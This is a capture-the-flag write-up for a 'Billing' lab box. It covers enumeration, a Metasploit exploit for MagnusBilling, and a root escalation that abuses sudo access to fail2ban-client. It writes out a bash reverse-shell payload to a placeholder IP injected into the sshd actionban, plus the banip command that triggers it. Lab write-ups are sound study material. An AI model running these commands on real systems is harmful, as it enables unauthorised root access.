I started this box with `Pull up` by Legendary ZerryDL after been away from boxes for a while due to personal reasons

Another night to pull up againn, We go againnnnn

Ion know what this box is all about what we are about to find out innit 

As we know the first thing is to get our nmap rolling 

```

Lots of endpoints are located hereee, this is looking good alreadyyyy

From the nmap scan, we discovered that they are 3 ports opened (22, 80, 3395, 5038)

Let us start our directory search too while enumerating the website

Now over to the website

![](https://i.imgur.com/wBc6AO8.png)


Let us go back to our directory fuzzing

![](https://i.imgur.com/9bCVgpV.png)

From there we were able to find the endpoint /robots.txt which still takes us to the login page

So, let us try to get another thing

Let us try enumerating the mysql

Enumerating this left us with no luck either.......

So I just went ahead googling to see if there is and exploit for magnus billing CMS. Lo and behold there is an exploit for that...

We are going to be using metasplot this time around

Bankaiii, we have initial access as seen below

![](https://i.imgur.com/mXjjRs4.png)

Let us now go to find user flag

![](https://i.imgur.com/GZyX84g.png)

Our work is halfdone, now let us go all in for the root flag

So, now in this part root is kinda trickyyyyy but imma still explain to the best of my knowledge

So after getting user flag, the first thing I always do is to try `sudo -l` to have a list of things that this user can do and this time was not in any way different

After running the command, the following was that I got

```
Matching Defaults entries for asterisk on Billing: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 

Runas and Command-specific defaults for asterisk: Defaults!/usr/bin/fail2ban-client !requiretty 

User asterisk may run the following commands on Billing: (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

From here all I knew was to abuse fail2ban to pop root shell and https://juggernaut-sec.com/fail2ban-lpe/ was the blog that helped me out

With all of this information, I crafted the following command:
```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"

```

This command modifies the `actionban` rule for the `sshd` jail, replacing the default IP banning action with a reverse shell payload. Normally, Fail2Ban executes the `iptables-multiport` action to ban IP addresses attempting brute-force attacks. However, by injecting my command, I ensure that instead of banning an IP, Fail2Ban will execute my reverse shell.

After modifying the `actionban` rule, I set up a listener on my machine to catch the reverse shell connection.

Lastly, I executed the following command:
```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

This command is typically used to manually ban an IP address using Fail2Ban. However, since I had previously modified the `actionban` rule to execute my reverse shell payload instead of banning an IP, running this command triggered the exploit. I used `127.0.0.1` because it is the **localhost IP address**, meaning the machine essentially "bans itself." Since Fail2Ban is configured to execute the `actionban` command whenever an IP is banned, triggering the ban on `127.0.0.1` ensures that the malicious command runs immediately on the same system without external dependencies.

BecauseFail2Ban runs with elevated privileges, the shell was spawned with **root** access, successfully granting me full control over the system.

With the root shell successfully obtained, I navigated to the `/root` directory and accessed the final flag!
